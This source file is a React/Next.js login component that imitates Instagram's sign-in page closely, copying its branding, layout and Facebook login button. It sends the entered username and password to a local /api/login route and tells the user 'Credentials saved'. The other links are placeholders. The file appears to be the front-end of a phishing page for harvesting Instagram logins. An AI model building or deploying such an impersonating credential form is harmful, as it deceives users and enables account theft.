'use client';

import { useState, FormEvent } from 'react';
import Link from 'next/link';

export default function LoginForm() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setMessage('Login successful! (Credentials saved)');
        // Clear the form
        setUsername('');
        setPassword('');
      } else {
        setMessage(data.error || 'Login failed');
      }
    } catch (error) {
      setMessage('An error occurred. Please try again.');
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-[350px]">
      {/* Login Box */}
      <div className="border border-[#262626] bg-black px-10 py-10 mb-3">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <h1 className="text-white text-[52px] tracking-wide" style={{ fontFamily: 'Billabong, cursive' }}>
            Instagram
          </h1>
        </div>

        {/* Login Form */}
        <form className="space-y-1.5" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username or email address"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full px-2 py-[9px] text-xs bg-[#121212] border border-[#262626] rounded-[3px] text-white placeholder-gray-500 focus:outline-none focus:border-[#363636]"
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-2 py-[9px] text-xs bg-[#121212] border border-[#262626] rounded-[3px] text-white placeholder-gray-500 focus:outline-none focus:border-[#363636]"
            required
          />
          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold py-[7px] px-4 rounded-lg text-sm mt-2 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Message Display */}
        {message && (
          <div className={`mt-4 text-xs text-center ${message.includes('successful') ? 'text-green-500' : 'text-red-500'}`}>
            {message}
          </div>
        )}

        {/* OR Divider */}
        <div className="flex items-center my-5">
          <div className="flex-1 border-t border-[#262626]"></div>
          <span className="px-4 text-[#737373] text-sm font-semibold">OR</span>
          <div className="flex-1 border-t border-[#262626]"></div>
        </div>

        {/* Facebook Login */}
        <button className="w-full flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm hover:text-[#4267B2] transition-colors">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
          </svg>
          Log in with Facebook
        </button>

        {/* Forgot Password */}
        <div className="text-center mt-5">
          <Link href="#" className="text-xs text-[#00376b] hover:text-white transition-colors">
            Forgotten your password?
          </Link>
        </div>
      </div>

      {/* Sign Up Box */}
      <div className="border border-[#262626] bg-black px-10 py-6 text-center">
        <p className="text-sm text-white">
          Don&apos;t have an account?{" "}
          <Link href="#" className="text-[#0095f6] font-semibold hover:text-white transition-colors">
            Sign up
          </Link>
        </p>
      </div>

      {/* Get the App */}
      <div className="mt-5 text-center">
        <p className="text-sm text-white mb-4">Get the app.</p>
        <div className="flex gap-2 justify-center">
          <Link href="#" className="block">
            <div className="h-10 bg-transparent border border-[#262626] rounded-md px-4 flex items-center hover:border-[#363636] transition-colors">
              <span className="text-white text-xs">Get it on Google Play</span>
            </div>
          </Link>
          <Link href="#" className="block">
            <div className="h-10 bg-transparent border border-[#262626] rounded-md px-4 flex items-center hover:border-[#363636] transition-colors">
              <span className="text-white text-xs">Get it from Microsoft</span>
            </div>
          </Link>
        </div>
      </div>
    </div>
  );
}
